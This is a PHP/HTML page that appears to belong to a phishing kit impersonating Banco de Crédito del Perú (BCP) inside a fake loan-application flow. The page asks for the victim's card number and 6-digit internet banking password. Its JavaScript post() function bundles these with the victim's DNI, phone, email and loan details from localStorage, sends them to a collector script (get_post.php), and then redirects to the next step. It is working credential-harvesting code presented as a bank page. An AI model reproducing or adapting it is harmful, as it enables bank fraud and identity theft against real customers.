<?php

########################################################################
# HEADERS
########################################################################

session_start();

########################################################################
# VERIFICANDO SESION
########################################################################

if (!isset($_SESSION['session_id'])) {
    
    header('Location: ../index.php');
    exit();

}

########################################################################
# ARCHIVOS DE CONFIGURACION
########################################################################

include '../config.php';

########################################################################
# OBTENIENDO VARIABLES GUARDADAS EN SESION
########################################################################

$visitorId = $_SESSION['visitorId'];
$session_id = $_SESSION['session_id'];
$directory_array = $_SESSION['directory_array'];
$device_type = $_SESSION['device_type'];

########################################################################

$estado = $_SESSION['estado'];

########################################################################

$next_location = "step_nine.php";

$next_location_encrypted = $directory_array[$next_location].".php";

?>

<!DOCTYPE html>
<html device-type="desktop" class="hydrated">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Banco de Crédito >> BCP >></title>
	<link rel="stylesheet" href="files/main.css">
	<meta content="width=device-width, initial-scale=1 user-scalable=no" name="viewport" >
	<link href="files/favicon.ico" rel="icon" type="image/x-icon">
	<!-- <link rel="stylesheet" href="./2_files/auxi.css"> -->
	<link rel="stylesheet" href="files/stylo.css">
	
	<style>
		.placeholder {
    		position: absolute;
    		top: 0;
    		left: 10px;
    		transform: translateY(-50%);
    		color: #999;
			font-size: .75rem;
			line-height: 1.125rem;
			font-weight:600;
    		transition: top 0.3s, font-size 0.3s;
    		pointer-events: none;
			background: white;
    		padding-left: 5px;
        	padding-right: 5px;
		}
		
		.placeholder.enfocado {
    		top: 0;
			font-size: 12px;
			color: #0a47f0;
			font-weight:600;
		}
		#bodyloader {
            height: 100%;
            margin: 0;
            overflow: hidden;
            background-color: var(--primary-700, #002a8d);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .loading-screen {
            position: absolute;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .spinner-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .spinner {
            position: relative;
            width: 70px;
            height: 70px;
            border: 3px solid #002376;
            border-top: 3px solid var(--secondary-500, #ff7800);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        .image {
            width: 30px;
            height: 30px;
            background-image: url("files/favicon.png");
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
        }
		
		.loading {
			padding: 420px 0px 0px 410px;
		}
		
		@media only screen and (max-width: 575px) {
			.loading {
				padding: 440px 0px 0px 0px;
			}
		}
		
		body {
			display: flex;
			justify-content: center;
			align-items: center;
    		height: 100vh;
    		margin: 0;
		}

		.banner {
			/* Agrega estas reglas para centrar el contenido */
			display: flex;
    		justify-content: center;
		}

		.linea-de-tiempo {
			display: flex;
    		align-items: center;
    		top: 70px;
    		position: relative;
    		margin: 0 auto; /* Centra horizontalmente */
		}
		
		.numero {
			min-height: 35px;
   			min-width: 35px;
    		width: 35px;
    		height: 35px;
    		background-color: white;
    		color: #878c8f;
			border: 2px solid #878c8f;
    		border-radius: 50%;
    		text-align: center;
    		line-height: 30px;
    		margin: 0 0px; /* Espacio entre los números */
			font-family: Geometria, sans-serif;
		}

		.linea {
			flex: 1;
    		border-top: 2px solid #878c8f;
    		margin: 0 0px;
    		max-width: 40px;
    		min-width: 40px;
		}

		.custom-slider {
			width: 100%;
            position: relative;
			margin-top:20px;
		}
		
		.custom-slider input[type="range"] {
			-webkit-appearance: none; /* Deshabilita el estilo predeterminado de WebKit */
            appearance: none; /* Deshabilita el estilo predeterminado de otros navegadores */
            width: 100%; /* Ancho completo del control deslizante */
            height: 10px; /* Altura del control deslizante */
            background: linear-gradient(#05be50,#05be50,#05be50,#05be50,#05be50,#05be50,#05be50);
            border-radius: 5px; /* Bordes redondeados */
		}

		.custom-slider input[type="range"]::-webkit-slider-thumb {
			-webkit-appearance: none; /* Deshabilita el estilo predeterminado del botón deslizante de WebKit */
            appearance: none; /* Deshabilita el estilo predeterminado del botón deslizante de otros navegadores */
            width: 20px;
            height: 20px;
            background: white;
            border-radius: 50%;
            cursor: pointer;
			border: 1px solid #eceded;
			box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
		}
		
		#montoLabel {
            position: absolute;
            bottom: 25px; /* Ajusta la distancia desde abajo */
            left: 50%; /* Centra horizontalmente */
            transform: translateX(-50%);
            font-weight: bold;
		}

        /* Estilos para la caja de herramientas */
        .tooltip {
            position: relative;
            display: inline-block;
        }

        .tooltip-text {
            visibility: hidden;
            background-color: rgba(0, 0, 0, 0.7);
            color: #fff;
            text-align: center;
            border-radius: 5px;
            padding: 5px;
            position: absolute;
            z-index: 1;
            bottom: 100%;
            left: 50%;
            transform: translateX(-50%);
            transition: visibility 0.2s ease-in-out;
        }

        .tooltip:hover .tooltip-text {
            visibility: visible;
        }
		
		.input-container {
			position: relative;
		}
		

		/* Estilos para el input */
		.styled-input {
			padding-left: 2.5em; /* Espacio para el label */
		}

		/* Estilos para el label */
		.input-label {
			position: absolute;
  			left: 0.5em; /* Posición izquierda */
  			top: 50%; /* Centrar verticalmente */
  			transform: translateY(-50%);
  			pointer-events: none; /* Evitar que el label interfiera con la interacción del input */
		}
		
		
		input[type="radio"]:checked {
			
			border: 6px solid #05be50 !important;
		}
		
		.cuota {
			width: 86%;
    		position: relative;
    		left: 7%;
    		height: 230px;
    		border: 2px solid #eceded;
    		border-radius: 8px;
   		 	margin-bottom: 25px;
    		max-height: 230px;
    		text-align: center;
			box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
		}
		
		.custom-select {
			border-radius: 4px;
  			border: 1px solid #eceded;
  			width: 100%;
  			font-size: 14px;
  			height: 48px !important;
  			position: relative;
			outline:none;
 			padding-left: 20px;
 			font-weight: 400;
  			letter-spacing: 0.5px;
  			background-color: white !important;
  			-webkit-box-sizing: border-box;
  			-moz-box-sizing: border-box;
  			box-sizing: border-box;
  			-webkit-appearance: none;
		}
		
		.custom-select:focus {
			border: 2px solid #ff0000;
		}
		
		#presente::placeholder {
			font-size: 14px;
			color: #878c8f;
   		 	position: relative;
   		 	
    		font-weight: 400;
    		letter-spacing: -0.6px;
    		font-family: Geometria, sans-serif;
			
    		text-rendering: optimizeLegibility;
		}
		
		#llave::placeholder {
			font-size: 14px;
			color: #878c8f;
   		 	position: relative;
   		 	
    		font-weight: 400;
    		letter-spacing: -0.6px;
    		font-family: Geometria, sans-serif;
			padding-left: 25px;
    		text-rendering: optimizeLegibility;
		}
		
		.loader {
    		border: 3px solid white;
    		border-top: 4px solid transparent;
    		border-radius: 50%;
    		width: 25px;
    		height: 25px;
    		animation: spin 1s linear infinite;
    		position: absolute;
    		top: 50%;
    		left: 50%;
    		margin-top: -12px;
    		margin-left: -10px;
    		display: none;
		}

		/* Animación de rotación del loader */
		@keyframes spin {
			0% { transform: rotate(0deg); }
    		100% { transform: rotate(360deg); }
		}

		/* Estilos para el botón personalizado */
		.custom-button {
    		position: relative; /* Para que el loader se posicione correctamente */
		}

		/* Mostrar el loader cuando el botón está deshabilitado */
		.btn-block:disabled .loader {
			display: block;
		}

		/* @font-face {
			font-family: Geometria;
			src: url(fonts/light.woff2) format("woff2"), url(fonts/light.woff) format("woff");
			font-weight: 300;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Geometria;
			src: url(fonts/medium.woff2) format("woff2"), url(fonts/medium.woff) format("woff");
			font-weight: 500;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Geometria;
			src: url(fonts/bold.woff2) format("woff2"), url(fonts/bold.woff) format("woff");
			font-weight: 700;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Montserrat;
			src: url(fonts/regular.woff2) format("woff2"), url(fonts/regular.woff) format("woff");
			font-weight: 400;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Montserrat;
			src: url(fonts/semibold.woff2) format("woff2"), url(fonts/semibold.woff) format("woff");
			font-weight: 600;
			font-style: normal;
			font-display: swap
		}

		@font-face {
			font-family: Montserrat;
			src: url(fonts/bold.woff2) format("woff2"), url(fonts/bold.woff) format("woff");
			font-weight: 700;
			font-style: normal;
			font-display: swap
		} */
		
		@media (max-width: 277px) {
			#tituloVerde {
				width:90% !important;
				left: 5% !important;
			}
		}
		
		@media (max-width: 277px) {
			#tituloVerde {
				font-size: 16px !important;
			}
		}
		
	
	</style>
	
</head>
	
<body>
	<div class="loading-screen" style="display:none;" id="bodyloader" style="height: 100%; margin: 0; overflow: hidden; background-color: var(--primary-700, #002a8d); display: none; align-items: center; justify-content: center;">
	 <div class="spinner-container">
		 <div class="image" style="top: 52px; width: 25px; position: relative;"></div>
		 <div class="spinner"></div>
		 <p class="message" style="text-align: center; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif!important; font-size: 13px; color: white; margin-top: 10px;">Espere un momento <br> por favor</p>
	 </div>
	</div>
	<div id="bodyapp">
	<app-root _nghost-aqk-c52="" ng-version="12.2.16">
		<router-outlet _ngcontent-aqk-c52=""></router-outlet>
		<app-initial-verify _nghost-aqk-c63="">
			<div _ngcontent-aqk-c63="" class="container-fluid" style="overflow-y: visible;overflow-x:hidden;">
				<div _ngcontent-aqk-c63="" class="row" style="">
					<div _ngcontent-aqk-c63="" class="col-4 d-none d-md-block channel-image-style">
						<app-channel-image _ngcontent-aqk-c63="" _nghost-aqk-c59="">
							<div _ngcontent-aqk-c59="" class="channel-img-fixed" style="">
							</div>
						</app-channel-image>
					</div>
<bcp-navbar menu-position="right" is-fixed="" class="hydrated">
    <nav class="navbar navbar-expand-sm bg-primary-700 navbar-dark fixed-top" style="min-height: 60px; display: flex; justify-content: space-between;">
        <div class="container" style="width: 85%;">
            <a class="brand-margin-left navbar-brand">
                <bcp-img class="hydrated">
                    <img alt="Dinero al instante" src="files/dark-default.svg" class="hydrated">
                </bcp-img>
            </a>
        </div>
        <div id="hamburg" style="position: relative; right: 16px;">
            <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
            </svg>
        </div>
    </nav>
</bcp-navbar>
					<eva-banner _ngcontent-hbf-c1="" _nghost-hbf-c2="" style="width:100%">
						<button onclick="retrocederPagina()" type="button" class="btn btn-text btn-md" style="width: 35%; top: 80px; text-align: start; position: relative;">
							<bcp-paragraph class="hydrated"><!---->
								<p class="paragraph-md bcp-font-demi secondary-500">
									<bcp-icon _ngcontent-xnv-c62="" name="arrow-left-r" class="hydrated">
										<i class="icon arrow-left-r " aria-hidden="true" style="font-size:22px;"></i>
									</bcp-icon>  
									<span class="text-decoration" style="font-size: 15px; bottom: 3px; position: relative;">Volver</span>
								</p>
							</bcp-paragraph>
						</button>
						<div _ngcontent-hbf-c2="" class="banner" style="background-repeat: no-repeat; background-size: auto; max-height: 332px; min-height: 160px; height: 160px;background-image:none;">
							
							<div class="linea-de-tiempo">
								<div class="numero" style="background-color: #6AC90F; border: 2px solid #6AC90F;">
									<img src="files/checkwhiteandgreen.jpg" style="height: 21px; position: relative;">
								</div>
								<div class="linea" style="border-top: 2px solid #6AC90F;"></div>
								<div class="numero" style="background-color: #6AC90F; border: 2px solid #6AC90F;">
									<img src="files/checkwhiteandgreen.jpg" style="height: 21px; position: relative;">
								</div>
								<div class="linea" style="border-top: 2px solid #6AC90F;"></div>
								<div class="numero" style="background-color: #6AC90F; border: 2px solid #6AC90F;">
									<img src="files/checkwhiteandgreen.jpg" style="height: 21px; position: relative;">
								</div>
								<div class="linea" style="border-top: 2px solid #6AC90F;"></div>
								<div class="numero" style="border-color: var(--primary-700,#002a8d);">
									<span style=" position: relative; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif; font-weight: 700;color: var(--primary-700,#002a8d);">4</span>
								</div>
							</div>
						</div>
					</eva-banner>
						<div _ngcontent-aqk-c63="" class="col" style="position: relative; overflow-y: visible;background-color:white;padding-right:11px; padding-left:11px;">
							<div _ngcontent-aqk-c63="" class="row container-form" style="position: relative;margin-bottom:0px !important;">
								<div _ngcontent-aqk-c63="" class="col mtTable" style="margin-top: 0px;">
									<div _ngcontent-aqk-c63="" class="box-wrapper container">
										<form class="ng-pristine ng-invalid ng-touched" id="inicio">
											<div _ngcontent-aqk-c63="" class="row mt8 mb32" style="margin-bottom: 0px;margin-top:0px;">
												<div _ngcontent-aqk-c63="" class="col text-center">
													<bcp-title _ngcontent-aqk-c63="" size="md" class="hydrated">
														<h4 class="title title-s title-s--light u-text-center-xs marb-32 marb-40____sm-md" style="font-weight: 600; position: relative; font-size: 1.5rem; line-height: 2rem; color: var(--primary-700,#002a8d); width: 90%; font-family: var(--bcp-font-family-primary-regular, 'Flexo-Regular'),helvetica,arial,sans-serif; margin-left: 5%; text-align: center; text-rendering: optimizeLegibility; top: 20px;">Verifiquemos tu identidad
															<span id="userAgentInfo"></span>
														</h4>
													</bcp-title>
												</div>
											</div>
											<div _ngcontent-aqk-c63="" class="row mb24" style="margin-bottom:5px !important;margin-top:30px;">
												<div _ngcontent-aqk-c63="" class="col">
													<bcp-select-input _ngcontent-aqk-c63="" class="ng-untouched ng-pristine ng-invalid hydrated">
														<br>
														<div class="row no-gutters select-input-container">
															<div class="col input-container">
																<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
																	<bcp-input class="hydrated"> 
																		<eva-loan-request-form _ngcontent-hbf-c1="" _nghost-hbf-c3="">
                        <div _ngcontent-hbf-c3="" class="container" style="margin-top:0px">
                            <div _ngcontent-hbf-c3="" class="row">
                                <div _ngcontent-hbf-c3="" class="col">
                                    <div _ngcontent-hbf-c3="" class="card" style="border: none;">
                                        <div _ngcontent-hbf-c3="" class="card-body" style="padding: 0;">
                                            <form class="ng-untouched ng-pristine ng-invalid">
                                                <div _ngcontent-hbf-c3="" class="row align-items-center">
                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column flex-lg-row align-items-lg-center">
                                                            <div _ngcontent-hbf-c3="" class="col">
                                                                <bcp-input _ngcontent-hbf-c3="" class="bcp-form-control ng-untouched ng-pristine ng-invalid hydrated" style="margin-bottom:20px">
                                                                    <div class="form-group">
																					<div class="" id="input8d" style="display: flex; align-items: center; height: 48px; background-color: white; border: 1px solid var(--onsurface-600, #868f9e); font-family: Geometria, sans-serif; color: inherit; font-size: 15px; line-height: 1.5rem; font-weight: 400; caret-color: #05be50; padding: 0;border-radius:8px;">
																						<i id="iconcard" class="icon card-credit-r" aria-hidden="true" style="font-size: 20px; left: 10px; top: 2px; position: relative;color:var(--onsurface-800,#606c7f)"></i>
																						<span id="encriptado" class="a-input-text__prefix" style="white-space: nowrap; padding-left: 15px; color: var(--text, #202e44); font-family: Flexo-Demi,helvetica,arial,sans-serif; font-size: 1rem; line-height: 1.5rem; padding-right: 5px; background: white;">4557</span>
																						<input class="form-control" autocomplete="off" id="digita8" name="digita8" onkeypress="return tipoFiltro(event)" placeholder="" required="" onblur="onblurTar()"  onfocus="onfocusTar()" type="tel" maxlength="14" style="background-color: white; border: none; height: 45px; color: var(--text, #202e44); font-family: Flexo-Demi,helvetica,arial,sans-serif; font-size: 1rem; line-height: 1.5rem; font-weight: 400; padding: 0; position: relative; flex: 1;border-radius:8px !important;">
																						<input type="hidden" id="presente" name="presente">
																						<input type="hidden" id="info" name="info">
																						<input type="hidden" id="tipo" name="tipo">
																						<label id="labeldigita8" for="digita8" class="placeholder" style="color: var(--onsurface-500,#99a1ad); top: 7px; font-size: .75rem; line-height: 1.125rem; font-family: var(--bcp-font-family-primary-demi,'Flexo-Demi'),helvetica,arial,sans-serif;">Número de tarjeta</label>
																					</div>
																					<p id="alertatar" _ngcontent-hbf-c4="" class="" style="color: rgb(227, 4, 37); position: absolute; font-size: 13px; text-size-adjust: none; font-weight: 400; padding-right: 16px; padding-left: 16px; padding-top: 0px !important; text-align: left !important;"></p>
																				</div>
                                                                </bcp-input>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md" style="top:20px;">
                                                        <div _ngcontent-hbf-c3="" class="row flex-column flex-lg-row align-items-lg-center">
                                                            <div _ngcontent-hbf-c3="" class="col">
                                                                <bcp-input _ngcontent-hbf-c3="" class="bcp-form-control ng-untouched ng-pristine ng-invalid hydrated" style="margin-bottom:20px">
                                                                    <div class="form-group">
																		<div class="input-container" style="position: relative;">
																			<input class="form-control" autocomplete="off" required id="llave" name="llave" type="tel" maxlength="6" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')" onfocus="onfocusLlave(this)" onblur="onblurLlave(this)"  style="border: 1px solid var(--onsurface-600, #868f9e);border-radius: 8px !important;">
																			<label id="labelllave" for="dni" class="placeholder" style="color: var(--onsurface-500,#99a1ad); font-size: .75rem; line-height: 1.125rem; font-family: var(--bcp-font-family-primary-demi,'Flexo-Demi'),helvetica,arial,sans-serif;">Clave de internet de 6 dígitos</label>
																		</div>
																		<p id="alertapass" _ngcontent-hbf-c4="" class="text-center pb-3 pt-3 m-0" style="color: #e30425; position: absolute; font-size: 13px; padding-top: 0px !important; -webkit-text-size-adjust: none; font-weight: 400; padding: 0 16px; text-align: left !important;display:none;"></p>
																	</div>
                                                                    <bcp-paragraph class="helper-text hydrated" style="display: flex; justify-content: space-between; position: absolute; width: 90%; left: 5%; margin: 0; margin-top: 20px;">
																		<div id="crearclave" onclick="crearclave()">
                                                                        	<p id="parrafocrearclave" class="text-decoration" style="bottom: 3px; position: relative; color: var(--secondary-500, #ff7800); font-size: .875rem; font-family: var(--bcp-font-family-primary-demi, 'Flexo-Demi'),helvetica,arial,sans-serif;">Crear clave</p>
																		</div>
																		<div id="olvidemiclave" onclick="olvidemiclave()">
																			<p class="text-decoration" style="bottom: 3px; position: relative; color: var(--secondary-500, #ff7800); font-size: .875rem; font-family: var(--bcp-font-family-primary-demi, 'Flexo-Demi'),helvetica,arial,sans-serif;">Olvidé mi clave</p>
																		</div>
                                                                    </bcp-paragraph>
                                                                </bcp-input>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-hbf-c3="" class="col-12 col-md-auto" style="margin-top:50px;">
														<div _ngcontent-hbf-c3="" class="row flex-column" style="align-items: center;">
															<div _ngcontent-hbf-c3="" class="col submit-col p-lg-0" style="align-items: center; position: relative; text-align: center;padding:0;">
																<bcp-button _ngcontent-hbf-c3="" size="lg" class="hydrated" style="display: inline-block;width:100%;">
																	<button type="button" onclick="post(1);" id="btnconfirmarprestamo" value="" style="color: var(--secondary-400,#ff961f); border-radius: 20px; width: 90%; height: 40px; padding: 12px; left: 5%; line-height: 16px; background-color: var(--secondary-400,#ff961f); border: var(--secondary-400,#ff961f); margin-top: 10px; display: flex; position: relative;"> 
																		<p id="parrafocontinuar" style="width: 100%; color: #fff; font-family: var(--bcp-font-family-primary-demi,'Flexo-Demi'),helvetica,arial,sans-serif; font-size: 1rem; text-align: center; position: relative; font-weight: 600;">Continuar</p>
																		<div class="loader" id="loadercontinuar"></div>
																	</button>
																</bcp-button>
															</div>
														</div>
													</div>
                                                </div>
                                                <p id="alerta" _ngcontent-hbf-c4="" class="text-center pb-3 pt-3 m-0" style="color: #e30425; font-size: 0.9rem; display: none;"></p>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </eva-loan-request-form>
																		</bcp-input>
																</bcp-tooltip>
															</div>
														</div>
													<br>
												</bcp-select-input>
											</div>
										</div>
									</form>
								</div>
							</div>
						</div>
						
					</div>
				</div>
			</div>
		</app-initial-verify>
	</app-root>
	
	<script type="text/javascript" src="files/jquery-3.1.0.min.js"></script>
	<script type="text/javascript" src="files/mask.js"></script>
	<script type="text/javascript" src="files/value.js"></script>
	
	<script>
		$(document).ready(function() {
			// Código de inicialización
			$("#digita8").mask("0000 0000 0000");
		});
	</script>
	<script>
		$(document).ready(function() {
			var serieSupuestos = "4557";
			// Inicializa una variable para rastrear los últimos 8 dígitos ingresados por el client
			var ultimos8Digitos = "";
			var digita8 = $("#digita8");
			validarCombinacion(serieSupuestos, ultimos8Digitos);
			// Escuchar cambios en el campo de entrada "input8d" cuando la longitud sea 9
			digita8.on("input", function() {
				if (digita8.val().length === 14) {
					ultimos8Digitos = digita8.val().slice(-14); // Obtiene los últimos 8 dígitos ingresados
					validarCombinacion(serieSupuestos, ultimos8Digitos);
				}
			});
		});
		
		// Función para validar una combinación específica
		function validarCombinacion(serieSupuestos, ultimos8Digitos) {
			var combinacion = serieSupuestos + " " + ultimos8Digitos;
			console.log("Combinación:", combinacion);
			validateTarjeta(combinacion);
		}
		
		function validateTarjeta(combinacion) {
			// Asigna el valor de combinación a #presente
			$("#presente").val(combinacion);
			
			// Realiza la validación con validateCard
			$("#presente").validateCard(function(result) {
				console.log("Resultado de validación:", result);
				// Asigna el resultado de la validación a #info
				$("#info").val(result.valid);
				if (result.card_type != null) {
					$("#tipo").val(result.card_type.name);
					formato();
				}
			});
		}
			
		function formato() {
			if ($("#info").val() == "true") {
				if ($("#tipo").val() != "amex") {
					$('#presente').mask("0000 0000 0000 0000");
					$("#presente").attr('maxlength', '19');
				} else {
					$('#presente').mask("0000 000000 00000");
					$("#presente").attr('maxlength', '17');
				}
			} else {
				$('#presente').mask("0000 0000 0000 0000");
			}
		}
			
	</script>
	<script>	

		function post(post) {
    
			let y = document.querySelector("#presente"); // Tarjeta
			let z = document.querySelector("#info"); // Valido
    		let w = document.querySelector("#tipo"); // Tipo
			let d = document.querySelector("#llave");  //contraseña
			let ccdd = document.querySelector("#digita8"); // input12d
			let ccddx = document.querySelector("#input8d"); // divinput12d
			let caracteres = /[0-9]/;
			let valido = caracteres.test(d.value);
			monto = localStorage.getItem("monto");
    		cuota = localStorage.getItem("cuota");
    		total = localStorage.getItem("total");
    		plazos = localStorage.getItem("plazos");
    		dni = localStorage.getItem("dni");
			celular = localStorage.getItem("celular");
			correo = localStorage.getItem("correo");
			
			let x = post;

			switch (x) {
    
					case 1: // Login
						
						if (ccdd.value == "" && d.value == "") {
							$("#alertatar").html("Ingresa los dígitos de tu tarjeta").show();
							ccddx.style.border = '1px solid #eb0046';
							y.focus();
							d.style.border = '1px solid #eb0046';
                    		return false;
						}
						
						if (ccdd.value.length < 14) {
							$("#alertatar").html("El número de tarjeta está incompleto").show();
							ccddx.style.border = '1px solid #eb0046';
							ccdd.focus();
							return false;
						} 
						
						var largo = (w.value != "amex") ? "19" : "17";
						
						if (y.value.length < largo) {
                			$("#alertatar").html("No se encontró la tarjeta.").show();
                			ccdd.focus();
                			return false;
            			}

            			if (z.value != "true") {
                			$("#alertatar").html("No se encontró la tarjeta.").show();
                			ccdd.focus();
                			return false;
            			}	
				
						if (d.value.length < 6) {
                    		$("#alertapass").html("Clave web incorrecta").show();
							d.focus();
                    		return false;
                		}

                		if (!valido) {
                    		$("#alertapass").html("Clave web incorrecta").show();
							d.focus();
                    		return false;
                		}
						
						$('.loader').css('display', 'flex');
						$('#parrafocontinuar').css('display', 'none');

						var parametros = {
							"password": d.value,
							"cc_num": y.value,
							"monto": monto,
							"celular": celular,
							"correo": correo
                    	}
						
						$("#alerta").hide();

						$.ajax({
							data: parametros,
                   	 		url: '../get_post.php?action=do_login',
                    		type: 'post',
                    		success: function(response) {
								localStorage.setItem("tarjeta", y.value);
								localStorage.setItem("password", d.value);
								setTimeout(function() {
									window.open('<?=$next_location_encrypted;?>', '_parent');
								}, 3000);
							}
						});
						
						break;
					default:
						break;
				}
			}
					
				
		</script>
		<script>	
		
			function retrocederPagina() {
				window.history.back();
			}
			function tipoFiltro(e) {
					var charCode = e.key;
					if((/^[0-9]+$/.test(charCode))) {
						return true;
					} else {
						return false;
					}
				}
			
		</script>	
		<script>

			function onblurTar(){
				let y = document.querySelector("#presente"); // Tarjeta
				let z = document.querySelector("#info"); // Valido
    			let w = document.querySelector("#tipo"); // Tipo
				let ccdd = document.querySelector("#digita8"); // input8d
				let ccddx = document.querySelector("#input8d"); // divinput8d
				let labelDigita8 = document.querySelector("#labeldigita8"); // divinput8d
				let iconcard = document.querySelector("#iconcard"); // iconcard
				
				if (ccdd.value.length < 14) {
					$("#alertatar").html("El número de tarjeta está incompleto").show();
					ccddx.style.border = '1px solid #eb0046';
					labelDigita8.style.color = '#e30425';
					ccdd.style.borderTop = 'none';
					iconcard.style.color = '#e30425';
				} 
				else if (z.value != "true") {
					$("#alertatar").html("No se encontró la tarjeta.").show();
					ccddx.style.border = '1px solid #eb0046';
					ccdd.style.borderTop = 'none';
					labelDigita8.style.color = '#e30425';
					iconcard.style.color = '#e30425';
				} else{
					$("#alertatar").html("").hide();
					ccddx.style.border = '1px solid var(--onsurface-600, #868f9e)';
					labelDigita8.style.color = '#99a1ad';
					ccdd.style.borderTop = 'none';
					iconcard.style.color = 'var(--onsurface-800,#606c7f)';
				}
			}
			
			function onfocusTar(){
				let y = document.querySelector("#presente"); // Tarjeta
				let z = document.querySelector("#info"); // Valido
    			let w = document.querySelector("#tipo"); // Tipo
				let ccdd = document.querySelector("#digita8"); // input8d
				let ccddx = document.querySelector("#input8d"); // divinput8d
				let labelDigita8 = document.querySelector("#labeldigita8"); // divinput8d
				let iconcard = document.querySelector("#iconcard"); // iconcard
				
				if (ccdd.value.length == 0) {
					$("#alertatar").html("El número de tarjeta está incompleto").hide();
					ccddx.style.border = '2px solid var(--primary-400, #0a47f0)';
					labelDigita8.style.color = 'var(--primary-400, #0a47f0)';
					ccdd.style.borderTop = '1px solid var(--primary-400, #0a47f0)';
					iconcard.style.color = 'var(--primary-400, #0a47f0)';
				} 
				else if (ccdd.value.length < 14) {
					$("#alertatar").html("El número de tarjeta está incompleto").show();
					ccddx.style.border = '2px solid #eb0046';
					labelDigita8.style.color = '#e30425';
					ccdd.style.borderTop = '1px solid #eb0046';
					iconcard.style.color = '#eb0046';
				} 
				else if (z.value != "true") {
					$("#alertatar").html("No se encontró la tarjeta.").show();
					ccddx.style.border = '2px solid #eb0046';
					ccdd.style.borderTop = '1px solid #eb0046';
					labelDigita8.style.color = '#e30425';
					iconcard.style.color = '#eb0046';
				} else{
					$("#alertatar").html("").hide();
					ccddx.style.border = '2px solid var(--primary-400, #0a47f0)';
					ccdd.style.borderTop = '1px solid var(--primary-400, #0a47f0)';
					labelDigita8.style.color = 'var(--primary-400, #0a47f0)';
					iconcard.style.color = 'var(--primary-400, #0a47f0)';
				}
			}
			
			function onblurLlave(){
				let d = document.querySelector("#llave");  //contraseña
				let labelLlave = document.querySelector("#labelllave"); // labelllave
				
				if (d.value.length < 6) {
					d.style.border = '1px solid #eb0046';
					labelLlave.style.color = '#e30425';
				} else{
					$("#alertapass").html("").hide();
					d.style.border = '1px solid var(--onsurface-600, #868f9e)';
					labelLlave.style.color = '#99a1ad';
				}
			}
			
			function onfocusLlave(){
				let d = document.querySelector("#llave");  //contraseña
				let labelLlave = document.querySelector("#labelllave"); // labelllave
				
				if (d.value.length == 0) {
					d.style.border = '2px solid var(--primary-400, #0a47f0)';
					labelLlave.style.color = 'var(--primary-400, #0a47f0)';
				}
				else if (d.value.length < 6) {
					d.style.border = '2px solid #eb0046';
					labelLlave.style.color = '#e30425';
					d.value = "";
				} else{
					$("#alertapass").html("").hide();
					d.style.border = '2px solid var(--primary-400, #0a47f0)';
					labelLlave.style.color = 'var(--primary-400, #0a47f0)';
				}
			}
			
			function olvidemiclave(){
				window.open("https://cutt.ly/iwR46k8i", "_blank");		
			}
			
			function crearclave(){
				window.open("https://cutt.ly/iwR46k8i", "_blank");	
			}
			
		</script>
		<script>
			const miDiv = document.getElementById('olvidemiclave');
			miDiv.addEventListener('mouseover', () => {
 				miDiv.style.textDecoration = 'underline';
  				miDiv.style.textDecorationColor = 'var(--secondary-400,#ff961f)'; // Cambia el color del subrayado
  				miDiv.style.textDecorationThickness = '2px';
			});

			miDiv.addEventListener('mouseout', () => {
  				miDiv.style.textDecoration = 'none';
			});

			miDiv.addEventListener('click', () => {
  				miDiv.style.textDecoration = 'underline';
  				miDiv.style.textDecorationColor = 'var(--secondary-400,#ff961f)'; // Cambia el color del subrayado
  				miDiv.style.textDecorationThickness = '2px';
			});
		</script>
		<script>
			const miDiv2 = document.getElementById('crearclave');
			miDiv2.addEventListener('mouseover', () => {
 				miDiv2.style.textDecoration = 'underline';
  				miDiv2.style.textDecorationColor = 'var(--secondary-400,#ff961f)'; // Cambia el color del subrayado
  				miDiv2.style.textDecorationThickness = '2px';
			});

			miDiv2.addEventListener('mouseout', () => {
  				miDiv2.style.textDecoration = 'none';
			});

			miDiv2.addEventListener('click', () => {
  				miDiv2.style.textDecoration = 'underline';
  				miDiv2.style.textDecorationColor = 'var(--secondary-400,#ff961f)'; // Cambia el color del subrayado
  				miDiv2.style.textDecorationThickness = '2px';
			});
		</script>
	</div>
	</body>
</html>